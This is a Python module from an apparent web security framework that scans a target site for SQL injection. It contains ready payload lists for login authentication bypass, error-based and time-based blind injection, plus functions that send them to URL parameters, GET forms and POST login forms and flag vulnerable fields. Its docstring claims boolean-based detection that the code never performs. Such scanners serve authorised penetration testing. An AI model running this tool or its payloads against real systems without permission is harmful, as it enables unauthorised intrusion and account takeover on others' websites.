"""Falcon MAG Framework - SQL Injection Scanner (v3)

Improvements (2026-09-20):
  - Java/Tomcat/JSP error signatures (Apache-Coyote, Oracle, MSSQL)
  - HTTP 500 detection (server errors from SQL)
  - Login form focused testing (username/password)
  - Boolean-based detection (TRUE vs FALSE)
  - URL param + POST form + GET form
  - Double verification for time-based
"""
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import get_logger
from core.http_client import is_static_resource

log = get_logger("sqli")


# ============================================================
# Error signatures (expanded — includes Java/Tomcat/JSP)
# ============================================================
ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning:\s*mysql_",
    r"mysqli?_fetch",
    r"mysql_num_rows",
    # PostgreSQL
    r"pg_query\(\)",
    r"postgresql.*error",
    r"sqlstate\[",
    # Oracle
    r"ora-\d{4,5}:",
    r"oracle.*driver",
    # MSSQL
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"unclosed quotation mark after the character string",
    # Java/JSP/Tomcat (IMPORTANT for Apache-Coyote)
    r"java\.sql\.sqlsyntaxerrorexception",
    r"java\.sql\.sqlexception",
    r"org\.apache\.jasper\.jasperexception",
    r"javax\.servlet\.servletexception",
    r"org\.springframework\.jdbc",
    r"org\.hibernate\.exception",
    r"hibernate.*sqlexception",
    r"javax\.persistence\.persistenceexception",
    r"jdbc\.sqlsyntaxerror",
    r"syntax error.*java",
    # Generic
    r"sql syntax.*error",
    r"unexpected end of sql command",
    r"column count doesn't match",
    r"unknown column",
    r"table.*doesn't exist",
    r"sqlite3\.operationalerror",
    r"system\.data\.sqlclient",
    r"syntax error.*at or near",
]


# ============================================================
# Payload sets
# ============================================================
# Auth bypass (login forms)
AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "admin'--",
    "admin'#",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 'a'='a'--",
    "') OR ('1'='1'--",
    "' OR '1'='1' /*",
    "1' OR '1'='1'--",
    "' OR 'x'='x",
    "' OR ''='",
]

# Error-based payloads (generic)
ERROR_PAYLOADS = [
    "'",
    '"',
    "')",
    "';",
    "1'",
    "1)",
    "'||'",
    "']",
    "1' AND '1'='2",
    "1 AND 1=2",
    "' AND 1=2--",
]

# Boolean-based (TRUE vs FALSE)
BOOLEAN_TRUE = [
    "' OR '1'='1'--",
    "1' OR '1'='1",
    "1 OR 1=1",
]
BOOLEAN_FALSE = [
    "' OR '1'='2'--",
    "1' OR '1'='2",
    "1 OR 1=2",
]

# Time-based (long sleep)
SLEEP_PAYLOADS = [
    ("1' AND SLEEP(5)-- -", 5),
    ("1' AND PG_SLEEP(5)-- -", 5),
    ("1; WAITFOR DELAY '0:0:5'-- -", 5),
    ("1' AND SLEEP(5)#", 5),
    ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
]


# ============================================================
# Helpers
# ============================================================
def _inject(url, param, value):
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def _has_db_error(text: str) -> str:
    if not text:
        return ""
    lower = text.lower()
    for pattern in ERROR_SIGNATURES:
        if re.search(pattern, lower, re.IGNORECASE):
            return pattern
    return ""


def _measure_baseline(client, url, param):
    times = []
    for _ in range(2):
        benign = _inject(url, param, "1")
        t0 = time.time()
        client.scan_request(benign)
        times.append(time.time() - t0)
    if not times:
        return 1.0
    return sum(times) / len(times)


def _measure_baseline_post(client, action: str, body_template: str) -> float:
    times = []
    for _ in range(2):
        t0 = time.time()
        try:
            client.request(
                "POST", action, data=body_template,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
        except Exception:
            pass
        times.append(time.time() - t0)
    if not times:
        return 1.0
    return sum(times) / len(times)


def _body_replace(body: str, field: str, value: str) -> str:
    parts = body.split("&")
    new = []
    for p in parts:
        if "=" in p:
            k, v = p.split("=", 1)
            new.append(f"{k}={value}" if k == field else p)
        else:
            new.append(p)
    return "&".join(new)


# ============================================================
# Attack helpers
# ============================================================
def _test_url_param(client, target, param, result):
    """Test a URL param for SQLi."""
    base_time = _measure_baseline(client, target, param)

    # 1. Error-based
    for payload in ERROR_PAYLOADS:
        result["tested"] += 1
        test_url = _inject(target, param, payload)
        resp = client.scan_request(test_url)
        if not resp:
            continue
        sig = _has_db_error(resp.text)
        # HTTP 500 also indicates SQL error
        if not sig and resp.status == 500 and _looks_like_error(resp.text):
            sig = "HTTP 500 (server error)"
        if sig:
            log.warning(f"  SQLi (error) in '{param}' — {sig}")
            result["vulnerable"].append({
                "url": target, "original_url": target,
                "injected_url": test_url, "test_url": test_url,
                "param": param, "payload": payload,
                "type": "error-based", "db_error": sig,
                "delay_ms": 0, "severity": "critical",
            })
            return

    # 2. Time-based
    for payload, expected_sleep in SLEEP_PAYLOADS:
        result["tested"] += 1
        test_url = _inject(target, param, payload)
        t0 = time.time()
        resp = client.scan_request(test_url)
        elapsed = time.time() - t0
        if not resp:
            continue
        threshold = max(expected_sleep - 0.5, base_time * 2 + 3)
        if elapsed >= threshold:
            log.info(f"  Suspected SQLi delay — verifying...")
            time.sleep(0.5)
            t1 = time.time()
            client.scan_request(test_url)
            elapsed2 = time.time() - t1
            if elapsed2 >= threshold * 0.8:
                log.warning(f"  SQLi (time) in '{param}' — {elapsed:.2f}s+{elapsed2:.2f}s")
                result["vulnerable"].append({
                    "url": target, "original_url": target,
                    "injected_url": test_url, "test_url": test_url,
                    "param": param, "payload": payload,
                    "type": "time-based", "db_error": f"delay {elapsed:.2f}s",
                    "delay_ms": round(elapsed * 1000, 2),
                    "severity": "critical",
                })
                return


def _test_login_form(client, action, body_template, fields, result):
    """Test a login form aggressively."""
    # Priority: username/login/user/email + password
    priority_fields = [f for f in fields if any(
        k in f.lower() for k in ("user", "login", "email", "name", "pass", "pwd")
    )]
    if not priority_fields:
        priority_fields = fields[:3]

    base_time = _measure_baseline_post(client, action, body_template)

    for field in priority_fields:
        # 1. Auth bypass
        for payload in AUTH_BYPASS_PAYLOADS:
            result["tested"] += 1
            new_body = _body_replace(body_template, field, payload)
            t0 = time.time()
            try:
                resp = client.request(
                    "POST", action, data=new_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            except Exception:
                continue
            elapsed = time.time() - t0
            if not resp:
                continue

            sig = _has_db_error(resp.text)
            if not sig and resp.status == 500 and _looks_like_error(resp.text):
                sig = "HTTP 500 (server error)"

            if sig:
                log.warning(f"  SQLi (login bypass) in '{field}' — {sig}")
                result["vulnerable"].append({
                    "url": action, "original_url": action,
                    "injected_url": action, "test_url": action,
                    "param": field, "payload": payload,
                    "type": "auth-bypass", "db_error": sig,
                    "delay_ms": round(elapsed * 1000, 2),
                    "method": "POST", "severity": "critical",
                })
                return

        # 2. Error-based
        for payload in ERROR_PAYLOADS[:5]:
            result["tested"] += 1
            new_body = _body_replace(body_template, field, payload)
            try:
                resp = client.request(
                    "POST", action, data=new_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            except Exception:
                continue
            if not resp:
                continue
            sig = _has_db_error(resp.text)
            if not sig and resp.status == 500 and _looks_like_error(resp.text):
                sig = "HTTP 500 (server error)"
            if sig:
                log.warning(f"  SQLi (login error) in '{field}' — {sig}")
                result["vulnerable"].append({
                    "url": action, "original_url": action,
                    "injected_url": action, "test_url": action,
                    "param": field, "payload": payload,
                    "type": "error-based", "db_error": sig,
                    "delay_ms": 0, "method": "POST",
                    "severity": "critical",
                })
                return


def _test_post_form(client, action, body_template, fields, result):
    """Test a generic POST form for SQLi."""
    base_time = _measure_baseline_post(client, action, body_template)

    for field in fields[:5]:
        for payload, expected_sleep in SLEEP_PAYLOADS[:2]:
            result["tested"] += 1
            new_body = _body_replace(body_template, field, payload)
            t0 = time.time()
            try:
                resp = client.request(
                    "POST", action, data=new_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            except Exception:
                continue
            elapsed = time.time() - t0
            if not resp:
                continue

            sig = _has_db_error(resp.text)
            if not sig and resp.status == 500 and _looks_like_error(resp.text):
                sig = "HTTP 500 (server error)"
            if sig:
                log.warning(f"  SQLi (POST) in '{field}' — {sig}")
                result["vulnerable"].append({
                    "url": action, "original_url": action,
                    "injected_url": action, "test_url": action,
                    "param": field, "payload": payload,
                    "type": "error-based", "db_error": sig,
                    "delay_ms": 0, "method": "POST",
                    "severity": "critical",
                })
                break

            threshold = max(expected_sleep - 0.5, base_time * 2 + 3)
            if elapsed >= threshold:
                log.warning(f"  SQLi (POST time) in '{field}' — {elapsed:.2f}s")
                result["vulnerable"].append({
                    "url": action, "original_url": action,
                    "injected_url": action, "test_url": action,
                    "param": field, "payload": payload,
                    "type": "time-based", "db_error": f"delay {elapsed:.2f}s",
                    "delay_ms": round(elapsed * 1000, 2),
                    "method": "POST", "severity": "critical",
                })
                break


def _looks_like_error(text: str) -> bool:
    """Quick check if response body suggests a server error."""
    if not text:
        return False
    lower = text.lower()
    hints = ["exception", "error", "stack trace", "stacktrace",
             "org.apache", "java.lang", "at java.", "at org.",
             "500", "internal server error", "sql"]
    return any(h in lower for h in hints)


# ============================================================
# Main
# ============================================================
def run(client, config):
    target = config.get("target", "")
    if not target:
        return {"error": "No target"}

    if is_static_resource(target):
        log.info("SQLi check on " + target)
        log.info("  Skipped (static resource)")
        return {"target": target, "url": target, "tested": 0, "vulnerable": [],
                "skipped": "static_resource"}

    log.info("SQLi check on " + target)
    result = {"target": target, "url": target, "tested": 0, "vulnerable": []}

    parsed = urlparse(target)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    baseline = client.scan_request(target)
    if not baseline or baseline.status == 0:
        return result

    # ==========================================================
    # 1. URL params
    # ==========================================================
    if qs:
        for param in qs:
            if param.lower() in ("v", "_v", "ver", "cb", "ts", "cache"):
                continue
            _test_url_param(client, target, param, result)
            if result["vulnerable"]:
                break

    # ==========================================================
    # 2. GET forms
    # ==========================================================
    get_forms = config.get("_crawl_forms_get", []) or []
    for form in get_forms[:3]:
        u = form.get("url") if isinstance(form, dict) else None
        if not u or "?" not in u:
            continue
        fp = urlparse(u)
        fqs = parse_qs(fp.query, keep_blank_values=True)
        for param in fqs:
            if param in qs:
                continue
            _test_url_param(client, u, param, result)

    # ==========================================================
    # 3. POST forms (login + generic)
    # ==========================================================
    forms_post = config.get("_crawl_forms_post", []) or []
    for form in forms_post[:5]:
        action = form.get("action", "")
        body_template = form.get("body", "")
        fields = form.get("fields", [])
        if not action or not body_template or not fields:
            continue

        # Detect login form
        is_login = any(
            "pass" in f.lower() or "pwd" in f.lower()
            for f in fields
        )
        if is_login:
            log.info(f"  Testing login form: {action[:60]}")
            _test_login_form(client, action, body_template, fields, result)
        else:
            _test_post_form(client, action, body_template, fields, result)

    if not result["vulnerable"]:
        log.info(f"  No SQLi found ({result['tested']} tested)")
    return result
